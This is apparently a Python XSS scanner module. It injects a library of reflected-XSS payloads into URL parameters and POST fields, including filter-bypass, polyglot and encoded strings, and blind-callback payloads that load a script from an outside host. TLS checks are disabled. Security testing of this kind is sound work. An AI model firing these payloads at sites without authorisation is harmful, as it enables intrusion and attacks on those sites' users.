import logging
import re
from typing import Callable, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests

logger = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings()

# Payload library: basic, filter-bypass, polyglot
XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)'",
    # Filter bypass
    '<ScRiPt>alert(1)</ScRiPt>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
    # Encoded
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
]

BLIND_MARKER = "omni-xss-blind"

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})


def _inject_params(url: str, payload: str) -> list[str]:
    """Return list of URLs with each query param replaced by payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return [f"{url}{'?' if '?' not in url else '&'}q={requests.utils.quote(payload)}"]
    urls = []
    for key in params:
        injected = dict(params)
        injected[key] = [payload]
        flat = {k: v[0] for k, v in injected.items()}
        new_query = urlencode(flat)
        urls.append(parsed._replace(query=new_query).geturl())
    return urls


def _check_reflected(response_text: str, payload: str) -> bool:
    return payload in response_text or payload.lower() in response_text.lower()


def scan_xss(
    url: str,
    blind_callback: Optional[str] = None,
    timeout: int = 8,
    progress_fn: Optional[Callable] = None,
) -> dict:
    findings = []
    tested = 0
    errors = 0

    payloads = list(XSS_PAYLOADS)
    if blind_callback:
        payloads.append(f'<script src="{blind_callback}?m={BLIND_MARKER}"></script>')
        payloads.append(f'"><img src="{blind_callback}?m={BLIND_MARKER}">')

    for payload in payloads:
        inject_urls = _inject_params(url, payload)
        for inject_url in inject_urls:
            tested += 1
            try:
                resp = SESSION.get(inject_url, timeout=timeout, verify=False, allow_redirects=True)
                reflected = _check_reflected(resp.text, payload)
                if reflected:
                    findings.append({
                        "type": "reflected",
                        "url": inject_url,
                        "payload": payload,
                        "status_code": resp.status_code,
                        "confirmed": True,
                    })
                    logger.info(f"XSS reflected: {inject_url}")
            except requests.RequestException as exc:
                errors += 1
                logger.debug(f"XSS probe error {inject_url}: {exc}")

            # Also try POST
            try:
                resp = SESSION.post(url, data={"q": payload, "search": payload, "input": payload},
                                    timeout=timeout, verify=False)
                if _check_reflected(resp.text, payload):
                    findings.append({
                        "type": "reflected_post",
                        "url": url,
                        "payload": payload,
                        "status_code": resp.status_code,
                        "confirmed": True,
                    })
            except requests.RequestException:
                pass

            if progress_fn and tested % 5 == 0:
                progress_fn(tested, len(payloads) * len(inject_urls), len(findings))

    return {
        "url": url,
        "tested": tested,
        "errors": errors,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "finding_count": len(findings),
    }


def scan_xss_multi(base_url: str, paths: list[str], blind_callback: Optional[str] = None) -> list:
    results = []
    for path in paths:
        url = urljoin(base_url, path)
        result = scan_xss(url, blind_callback=blind_callback)
        if result["vulnerable"]:
            results.append(result)
    return results
